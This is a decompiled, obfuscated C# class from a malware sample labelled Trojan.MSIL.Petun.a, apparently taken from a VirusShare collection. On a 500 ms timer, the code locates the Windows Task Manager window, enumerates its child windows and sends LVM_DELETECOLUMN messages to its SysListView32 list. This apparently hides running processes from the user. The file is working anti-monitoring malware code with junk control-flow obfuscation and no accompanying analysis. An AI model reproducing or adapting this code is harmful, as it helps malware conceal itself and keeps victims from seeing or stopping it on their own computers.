// Decompiled with JetBrains decompiler
// Type: cnhziFozG
// Assembly: test1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E8116EE9-6C79-4180-A1B1-1330F6BC88B7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Petun.a-47e879175f4baac8d24e5f7eba026a7e6b2e35fefbd029453110345a2057ecce.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class cnhziFozG
{
  private const int LVM_FIRST = 4096;
  private const int LVM_DELETECOLUMN = 4124;
  private static object t = (object) new Timer();

  [MethodImpl(MethodImplOptions.NoInlining)]
  static cnhziFozG()
  {
  }

  [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SendMessage(IntPtr Hwnd, int wMsg, int wParam, int lParam);

  [DllImport("user32.dll", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int EnumChildWindows(
    IntPtr hWndParent,
    cnhziFozG.EnumDelegate lpEnumFunc,
    int lParam);

  [DllImport("user32.dll", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long GetClassName(long hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, long nMaxCount);

  [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

  [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

  [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowTextLength(IntPtr hWnd);

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void t_Tick(object sender, object e)
  {
    int num = 5;
    if (cnhziFozG.\u0039nBko8CvSwW4iYEPsna())
      goto label_5;
label_1:
    IntPtr hWndParent;
    cnhziFozG.EnumChildWindows(hWndParent, new cnhziFozG.EnumDelegate(cnhziFozG.EnumChildWindows), 0);
    num = 6;
label_5:
    string str1;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 1:
          ref string local1 = ref str1;
          string str2 = "Windows Task Manager";
          ref string local2 = ref str2;
          hWndParent = cnhziFozG.\u0038WcPfPCgN3DAt2So3iy(cnhziFozG.FindWindow(ref local1, ref local2));
          if (cnhziFozG.\u0039nBko8CvSwW4iYEPsna())
          {
            num = 4;
            continue;
          }
          goto label_3;
        case 4:
          goto label_3;
        case 5:
          str1 = (string) null;
          cnhziFozG.\u0039nBko8CvSwW4iYEPsna();
          if (cnhziFozG.Ah76rqCqTF7DxFiLB4h())
          {
            num = 2;
            continue;
          }
          if (true)
          {
            num = 0;
            continue;
          }
          goto label_10;
        case 6:
          goto label_4;
        default:
          goto label_1;
      }
    }
label_3:
    if (!cnhziFozG.vjePqkCHMIXvcjb0wff(hWndParent, cnhziFozG.\u0038WcPfPCgN3DAt2So3iy(0)))
      return;
    goto label_1;
label_4:
    return;
label_10:;
  }

  public static bool Running
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => cnhziFozG.\u00369icQXCPg7lCEK2gMmD(cnhziFozG.t);
    [MethodImpl(MethodImplOptions.NoInlining)] set
    {
      int num = 1;
      if (cnhziFozG.Ah76rqCqTF7DxFiLB4h())
        ;
      Timer t;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            cnhziFozG.lO6NFSCOZpE2iNeGsnT(cnhziFozG.t, (object) new EventHandler(cnhziFozG.t_Tick));
            num = 4;
            continue;
          case 1:
            if (value)
            {
              if (true)
              {
                num = 11;
                continue;
              }
              goto case 9;
            }
            else
            {
              cnhziFozG.fOqpZGCEOLPq4r63kph(cnhziFozG.t, false);
              num = 9;
              continue;
            }
          case 2:
            cnhziFozG.fOqpZGCEOLPq4r63kph((object) t, true);
            if (true)
            {
              num = 7;
              continue;
            }
            goto case 13;
          case 4:
            cnhziFozG.yDPM6XC9a7yKMBBSXfw((object) t, 500);
            if (true)
            {
              num = 2;
              continue;
            }
            goto label_17;
          case 5:
            goto label_18;
          case 6:
            goto label_4;
          case 7:
            goto label_13;
          case 8:
            goto label_1;
          case 9:
            cnhziFozG.EwCuWCC4SCtboTGl255(cnhziFozG.t);
            num = 14;
            continue;
          case 10:
            cnhziFozG.ih62DrCrs0aBKO8ycrP(cnhziFozG.t);
            if (true)
            {
              num = 5;
              continue;
            }
            goto label_3;
          case 11:
            if (cnhziFozG.ote2uhCF33uSZyMGiBy(cnhziFozG.t) == 500)
            {
              cnhziFozG.fOqpZGCEOLPq4r63kph(cnhziFozG.t, true);
              num = 10;
              continue;
            }
            if (cnhziFozG.\u0039nBko8CvSwW4iYEPsna())
            {
              num = 13;
              continue;
            }
            goto case 0;
          case 12:
            goto label_17;
          case 13:
            t = (Timer) cnhziFozG.t;
            cnhziFozG.\u0039nBko8CvSwW4iYEPsna();
            num = cnhziFozG.Ah76rqCqTF7DxFiLB4h() ? 6 : 0;
            continue;
          case 14:
            goto label_21;
          default:
            if (true)
            {
              num = 12;
              continue;
            }
            goto case 4;
        }
      }
label_3:
      return;
label_13:
      cnhziFozG.ih62DrCrs0aBKO8ycrP((object) t);
      goto label_17;
label_18:
      return;
label_4:
      return;
label_1:
      return;
label_21:
      return;
label_17:;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static int EnumChildWindows(IntPtr lngHwnd, int lngLParam)
  {
    cnhziFozG.Ah76rqCqTF7DxFiLB4h();
    int num = !cnhziFozG.\u0039nBko8CvSwW4iYEPsna() ? 10 : 4;
    string[] strArray;
    string str1;
    string str2;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 4:
          str1 = (string) cnhziFozG.lmk6t7CzenVT6ZfbnUi(lngHwnd);
          num = 3;
          continue;
        case 1:
          strArray[1] = ", ";
          goto case 7;
        case 2:
          strArray[0] = lngHwnd.ToString();
          if (cnhziFozG.\u0039nBko8CvSwW4iYEPsna())
          {
            num = 1;
            continue;
          }
          goto case 3;
        case 3:
          str2 = (string) cnhziFozG.\u0035xixEK6RCbBh5RLtvvh(lngHwnd);
          if (!cnhziFozG.Ah76rqCqTF7DxFiLB4h())
          {
            num = 6;
            continue;
          }
          goto case 6;
        case 5:
          strArray[3] = ", ";
          num = 9;
          continue;
        case 6:
          strArray = new string[5];
          if (true)
          {
            num = 2;
            continue;
          }
          goto case 5;
        case 7:
          strArray[2] = str1;
          if (true)
          {
            num = 5;
            continue;
          }
          goto case 9;
        case 8:
        case 10:
          string str3 = (string) cnhziFozG.KqyxBd6WHPOkRUptebK((object) strArray);
          num = 11;
          continue;
        case 9:
          strArray[4] = str2;
          goto case 8;
        case 11:
          goto label_12;
        default:
          num = 7;
          continue;
      }
    }
label_12:
    return 1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static string GetClass(IntPtr handle)
  {
    int num = 4;
    StringBuilder lpClassName;
    while (true)
    {
      switch (num)
      {
        case 0:
          cnhziFozG.SendMessage(handle, 4124, cnhziFozG.tDhJkF6KH0RIMYT371m(cnhziFozG.\u0038WcPfPCgN3DAt2So3iy(0)), 0);
          num = 7;
          continue;
        case 1:
          cnhziFozG.RVmebv6CjkiCd96IhbX((object) lpClassName, (int) byte.MaxValue);
          cnhziFozG.Ah76rqCqTF7DxFiLB4h();
          num = !cnhziFozG.\u0039nBko8CvSwW4iYEPsna() ? 6 : 5;
          continue;
        case 2:
        case 5:
          cnhziFozG.GetClassName(handle, lpClassName, cnhziFozG.\u0030fvp9566VnO8bKUKrT7((object) lpClassName));
          break;
        case 4:
          lpClassName = new StringBuilder();
          if (true)
          {
            num = 1;
            continue;
          }
          goto case 0;
        case 7:
          goto label_8;
      }
      if (cnhziFozG.bqZutr6segmAApJX2fH(cnhziFozG.tTBQml6edypUi76vrIG((object) lpClassName), (object) "SysListView32", CompareMethod.Binary) != 0)
        num = 0;
      else
        break;
    }
label_8:
    return (string) cnhziFozG.tTBQml6edypUi76vrIG((object) lpClassName);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static string GetTitleText(IntPtr handle)
  {
    cnhziFozG.\u0039nBko8CvSwW4iYEPsna();
    int num;
    if (!cnhziFozG.Ah76rqCqTF7DxFiLB4h())
    {
      num = 3;
      goto label_5;
    }
    else
    {
      num = 2;
      if (cnhziFozG.\u0039nBko8CvSwW4iYEPsna())
        goto label_5;
    }
label_4:
    StringBuilder lpString;
    cnhziFozG.RVmebv6CjkiCd96IhbX((object) lpString, checked (cnhziFozG.GetWindowTextLength(handle) + 1));
    goto label_7;
label_5:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 3:
          goto label_2;
        case 1:
        case 2:
          goto label_4;
        case 4:
          goto label_7;
        case 5:
          goto label_8;
        default:
          if (!cnhziFozG.Ah76rqCqTF7DxFiLB4h())
          {
            num = 4;
            continue;
          }
          goto label_7;
      }
    }
label_2:
    lpString = new StringBuilder();
    goto label_4;
label_8:
    return (string) cnhziFozG.tTBQml6edypUi76vrIG((object) lpString);
label_7:
    cnhziFozG.GetWindowText(handle, lpString, cnhziFozG.\u0030fvp9566VnO8bKUKrT7((object) lpString));
    num = 5;
    goto label_5;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static IntPtr \u0038WcPfPCgN3DAt2So3iy([In] int obj0) => (IntPtr) obj0;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool vjePqkCHMIXvcjb0wff([In] IntPtr obj0, [In] IntPtr obj1) => obj0 != obj1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0039nBko8CvSwW4iYEPsna() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool Ah76rqCqTF7DxFiLB4h() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u00369icQXCPg7lCEK2gMmD([In] object obj0) => ((Timer) obj0).Enabled;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int ote2uhCF33uSZyMGiBy([In] object obj0) => ((Timer) obj0).Interval;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void lO6NFSCOZpE2iNeGsnT([In] object obj0, [In] object obj1) => ((Timer) obj0).Tick += (EventHandler) obj1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void yDPM6XC9a7yKMBBSXfw([In] object obj0, [In] int obj1) => ((Timer) obj0).Interval = obj1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void fOqpZGCEOLPq4r63kph([In] object obj0, [In] bool obj1) => ((Timer) obj0).Enabled = obj1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void ih62DrCrs0aBKO8ycrP([In] object obj0) => ((Timer) obj0).Start();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void EwCuWCC4SCtboTGl255([In] object obj0) => ((Timer) obj0).Stop();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object lmk6t7CzenVT6ZfbnUi(IntPtr handle) => (object) cnhziFozG.GetClass(handle);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0035xixEK6RCbBh5RLtvvh(IntPtr handle) => (object) cnhziFozG.GetTitleText(handle);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object KqyxBd6WHPOkRUptebK([In] object obj0) => (object) string.Concat((string[]) obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void RVmebv6CjkiCd96IhbX([In] object obj0, [In] int obj1) => ((StringBuilder) obj0).Length = obj1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0030fvp9566VnO8bKUKrT7([In] object obj0) => ((StringBuilder) obj0).Length;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object tTBQml6edypUi76vrIG([In] object obj0) => (object) ((StringBuilder) obj0).ToString();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int bqZutr6segmAApJX2fH([In] object obj0, [In] object obj1, [In] CompareMethod obj2) => Strings.InStr((string) obj0, (string) obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int tDhJkF6KH0RIMYT371m([In] IntPtr obj0) => (int) obj0;

  private delegate int EnumDelegate(IntPtr lngHwnd, int lngLParam);
}
